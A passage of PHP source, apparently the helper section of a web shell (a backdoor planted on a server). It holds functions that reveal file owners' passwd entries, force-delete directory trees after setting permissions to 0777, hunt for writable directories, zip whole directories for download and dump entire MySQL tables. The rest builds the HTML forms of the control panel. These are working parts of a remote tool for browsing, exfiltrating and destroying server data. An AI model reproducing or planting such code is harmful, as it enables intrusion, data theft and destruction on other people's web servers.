 return $type . $owner['read'] . $owner['write'] . $owner['execute'] . $group['read'] . $group['write'] . $group['execute'] . $world['read'] . $world['write'] . $world['execute'];
}
function getUser($filepath)
{
 if (function_exists('posix_getpwuid')) {
  $array = @posix_getpwuid(@fileowner($filepath));
  if ($array && is_array($array)) {
 return ' / <a href="#" title="User: ' . $array['name'] . '&#13&#10Passwd: ' . $array['passwd'] . '&#13&#10Uid: ' . $array['uid'] . '&#13&#10gid: ' . $array['gid'] . '&#13&#10Gecos: ' . $array['gecos'] . '&#13&#10Dir: ' . $array['dir'] . '&#13&#10dxell: ' . $array['dxell'] . '">' . $array['name'] . '</a>';
  }
 }
 return '';
}
function deltree($deldir)
{
 $mydir = @dir($deldir);
 while ($file = $mydir->read()) {
  if ((is_dir($deldir . '/' . $file)) && ($file != '.') && ($file != '..')) {
 @chmod($deldir . '/' . $file, 0777);
 deltree($deldir . '/' . $file);
  }
  if (is_file($deldir . '/' . $file)) {
 @chmod($deldir . '/' . $file, 0777);
 @unlink($deldir . '/' . $file);
  }
 }
 $mydir->close();
 @chmod($deldir, 0777);
 return @rmdir($deldir) ? 1 : 0;
}
function bg()
{
 global $bgc;
 return ($bgc++ % 2 == 0) ? 'alt1' : 'alt2';
}
function getPath($scriptpath, $nowpath)
{
 if ($nowpath == '.') {
  $nowpath = $scriptpath;
 }
 $nowpath = str_replace('\\', '/', $nowpath);
 $nowpath = str_replace('//', '/', $nowpath);
 if (substr($nowpath, -1) != '/') {
  $nowpath = $nowpath . '/';
 }
 return $nowpath;
}
function getUpPath($nowpath)
{
 $pathdb = explode('/', $nowpath);
 $num = count($pathdb);
 if ($num > 2) {
  unset($pathdb[$num - 1], $pathdb[$num - 2]);
 }
 $uppath = implode('/', $pathdb) . '/';
 $uppath = str_replace('//', '/', $uppath);
 return $uppath;
}
function getcfg($varname)
{
 $result = get_cfg_var($varname);
 if ($result == 0) {
  return 'No';
 } elseif ($result == 1) {
  return 'Yes';
 } else {
  return $result;
 }
}
function getfun($funName)
{
 return (false !== function_exists($funName)) ? 'Yes' : 'No';
}
function GetList($dir)
{
 global $dirdata, $j, $nowpath;
 !$j && $j = 1;
 if ($dh = opendir($dir)) {
  while ($file = readdir($dh)) {
 $f = str_replace('//', '/', $dir . '/' . $file);
 if ($file != '.' && $file != '..' && is_dir($f)) {
  if (is_writable($f)) {
   $dirdata[$j]['filename'] = str_replace($nowpath, '', $f);
   $dirdata[$j]['mtime']  = @date('Y-m-d H:i:s', filemtime($f));
   $dirdata[$j]['dirchmod'] = getChmod($f);
   $dirdata[$j]['dirperm']  = getPerms($f);
   $dirdata[$j]['dirlink']  = ue($dir);
   $dirdata[$j]['server_link'] = $f;
   $dirdata[$j]['client_link'] = ue($f);
   $j++;
  }
  GetList($f);
 }
  }
  closedir($dh);
  clearstatcache();
  return $dirdata;
 } else {
  return array();
 }
}
function qy($sql)
{
 $res = $error = '';
 if (!$res = @mysql_query($sql)) {
  return 0;
 } else if (is_resource($res)) {
  return 1;
 } else {
  return 2;
 }
 return 0;
}
function q($sql)
{
 return @mysql_query($sql);
}
function fr($qy)
{
 mysql_free_result($qy);
}
function sizecount($size)
{
 if ($size > 1073741824) {
  $size = round($size / 1073741824 * 100) / 100 . ' G';
 } elseif ($size > 1048576) {
  $size = round($size / 1048576 * 100) / 100 . ' M';
 } elseif ($size > 1024) {
  $size = round($size / 1024 * 100) / 100 . ' K';
 } else {
  $size = $size . ' B';
 }
 return $size;
}
class PHPZip
{
 var $out = '';
 function PHPZip($dir)
 {
  if (@function_exists('gzcompress')) {
 $curdir = getcwd();
 if (is_array($dir))
  $filelist = $dir;
 else {
  $filelist = $this->GetFileList($dir);
  foreach ($filelist as $k => $v)
   $filelist[] = substr($v, strlen($dir) + 1);
 }
 if ((!empty($dir)) && (!is_array($dir)) && (file_exists($dir)))
  chdir($dir);
 else
  chdir($curdir);
 if (count($filelist) > 0) {
  foreach ($filelist as $filename) {
   if (is_file($filename)) {
  $fd = fopen($filename, 'r');
  $content = @fread($fd, filesize($filename));
  fclose($fd);
  if (is_array($dir))
   $filename = basename($filename);
  $this->addFile($content, $filename);
   }
  }
  $this->out = $this->file();
  chdir($curdir);
 }
 return 1;
  } else
 return 0;
 }
 function GetFileList($dir)
 {
  static $a;
  if (is_dir($dir)) {
 if ($dh = opendir($dir)) {
  while ($file = readdir($dh)) {
   if ($file != '.' && $file != '..') {
  $f = $dir . '/' . $file;
  if (is_dir($f))
   $this->GetFileList($f);
  $a[] = $f;
   }
  }
  closedir($dh);
 }
  }
  return $a;
 }
 var $datasec = array();
 var $ctrl_dir = array();
 var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
 var $old_offset = 0;
 function unix2DosTime($unixtime = 0)
 {
  $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
  if ($timearray['year'] < 1980) {
 $timearray['year'] = 1980;
 $timearray['mon']  = 1;
 $timearray['mday'] = 1;
 $timearray['hours'] = 0;
 $timearray['minutes'] = 0;
 $timearray['seconds'] = 0;
  }
  return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
 }
 function addFile($data, $name, $time = 0)
 {
  $name  = str_replace('\\', '/', $name);
  $dtime = dechex($this->unix2DosTime($time));
  $hexdtime = '\x' . $dtime[6] . $dtime[7] . '\x' . $dtime[4] . $dtime[5] . '\x' . $dtime[2] . $dtime[3] . '\x' . $dtime[0] . $dtime[1];
  eval('$hexdtime = "' . $hexdtime . '";');
  $fr = "\x50\x4b\x03\x04";
  $fr .= "\x14\x00";
  $fr .= "\x00\x00";
  $fr .= "\x08\x00";
  $fr .= $hexdtime;
  $unc_len = strlen($data);
  $crc  = crc32($data);
  $zdata = gzcompress($data);
  $c_len = strlen($zdata);
  $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
  $fr .= pack('V', $crc);
  $fr .= pack('V', $c_len);
  $fr .= pack('V', $unc_len);
  $fr .= pack('v', strlen($name));
  $fr .= pack('v', 0);
  $fr .= $name;
  $fr .= $zdata;
  $fr .= pack('V', $crc);
  $fr .= pack('V', $c_len);
  $fr .= pack('V', $unc_len);
  $this->datasec[] = $fr;
  $new_offset = strlen(implode('', $this->datasec));
  $cdrec   = "\x50\x4b\x01\x02";
  $cdrec .= "\x00\x00";
  $cdrec .= "\x14\x00";
  $cdrec .= "\x00\x00";
  $cdrec .= "\x08\x00";
  $cdrec .= $hexdtime;
  $cdrec .= pack('V', $crc);
  $cdrec .= pack('V', $c_len);
  $cdrec .= pack('V', $unc_len);
  $cdrec .= pack('v', strlen($name));
  $cdrec .= pack('v', 0);
  $cdrec .= pack('v', 0);
  $cdrec .= pack('v', 0);
  $cdrec .= pack('v', 0);
  $cdrec .= pack('V', 32);
  $cdrec .= pack('V', $this->old_offset);
  $this->old_offset = $new_offset;
  $cdrec .= $name;
  $this->ctrl_dir[] = $cdrec;
 }
 function file()
 {
  $data = implode('', $this->datasec);
  $ctrldir = implode('', $this->ctrl_dir);
  return $data . $ctrldir . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
 }
}
function sqldumptable($table, $fp = 0)
{
 $tabledump = "DROP TABLE IF EXISTS $table;\n";
 $tabledump .= "CREATE TABLE $table (\n";
 $firstfield = 1;
 $fields  = q("SHOW FIELDS FROM $table");
 while ($field = mysql_fetch_array($fields)) {
  if (!$firstfield) {
 $tabledump .= ",\n";
  } else {
 $firstfield = 0;
  }
  $tabledump .= " $field[Field] $field[Type]";
  if (!empty($field["Default"])) {
 $tabledump .= " DEFAULT '$field[Default]'";
  }
  if ($field['Null'] != "YES") {
 $tabledump .= " NOT NULL";
  }
  if ($field['Extra'] != "") {
 $tabledump .= " $field[Extra]";
  }
 }
 fr($fields);
 $keys = q("SHOW KEYS FROM $table");
 while ($key = mysql_fetch_array($keys)) {
  $kname = $key['Key_name'];
  if ($kname != "PRIMARY" && $key['Non_unique'] == 0) {
 $kname = "UNIQUE|$kname";
  }
  if (!is_array($index[$kname])) {
 $index[$kname] = array();
  }
  $index[$kname][] = $key['Column_name'];
 }
 fr($keys);
 while (list($kname, $columns) = @each($index)) {
  $tabledump .= ",\n";
  $colnames = implode($columns, ",");
  if ($kname == "PRIMARY") {
 $tabledump .= " PRIMARY KEY ($colnames)";
  } else {
 if (substr($kname, 0, 6) == "UNIQUE") {
  $kname = substr($kname, 7);
 }
 $tabledump .= "KEY $kname ($colnames)";
  }
 }
 $tabledump .= "\n);\n\n";
 if ($fp) {
  fwrite($fp, $tabledump);
 } else {
  echo $tabledump;
 }
 $rows = q("SELECT * FROM $table");
 $numfields = mysql_num_fields($rows);
 while ($row = mysql_fetch_array($rows)) {
  $tabledump = "INSERT INTO $table VALUES(";
  $fieldcounter = -1;
  $firstfield = 1;
  while (++$fieldcounter < $numfields) {
 if (!$firstfield) {
  $tabledump .= ", ";
 } else {
  $firstfield = 0;
 }
 if (!isset($row[$fieldcounter])) {
  $tabledump .= "NULL";
 } else {
  $tabledump .= "'" . mysql_real_escape_string($row[$fieldcounter]) . "'";
 }
  }
  $tabledump .= ");\n";
  if ($fp) {
 fwrite($fp, $tabledump);
  } else {
 echo $tabledump;
  }
 }
 fr($rows);
 if ($fp) {
  fwrite($fp, "\n");
 } else {
  echo "\n";
 }
}
function ue($str)
{
 return urlencode($str);
}
function p($str)
{
 echo $str . "\n";
}
function tbhead()
{
 p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot()
{
 p('</table>');
}
function makehide($name, $value = '')
{
 p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}
function makeinput($arg = array())
{
 $arg['size']  = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
 $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
 !$arg['type'] && $arg['type'] = 'text';
 $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
 $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
 if ($arg['newline']) {
  p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
 } else {
  p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
 }
}
function makeselect($arg = array())
{
 if ($arg['onchange']) {
  $onchange = 'onchange="' . $arg['onchange'] . '"';
 }
 $arg['title'] = $arg['title'] ? $arg['title'] : '';
 if ($arg['newline'])
  p('<p>');
 p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
 if (is_array($arg['option'])) {
  foreach ($arg['option'] as $key => $value) {
 if ($arg['selected'] == $key) {
  p("<option value=\"$key\" selected>$value</option>");
 } else {
  p("<option value=\"$key\">$value</option>");
 }
  }
 }
 p("</select>");
 if ($arg['newline'])
  p('</p>');
}
function formhead($arg = array())
{
 !$arg['method'] && $arg['method'] = 'post';
 !$arg['action'] && $arg['action'] = $self;
 $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
 !$arg['name'] && $arg['name'] = 'form1';
 p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
 if ($arg['title']) {
  p('<h2>' . $arg['title'] . ' &raquo;</h2>');
 }
}
function maketext($arg = array())
{
 !$arg['cols'] && $arg['cols'] = 200;
 !$arg['rows'] && $arg['rows'] = 25;
 $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
 p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}
function formfooter($name = '')
{
 !$name && $name = 'submit';
 p('<p><input class="bt" name="' . $name . '" id=\"' . $name . '\" type="submit" value="Submit"></p>');
 p('</form>');
}
function formfoot()
{
 p('</form>');
}
function pr($a)
{
 echo '<pre>';
 echo '</pre>';
}
?>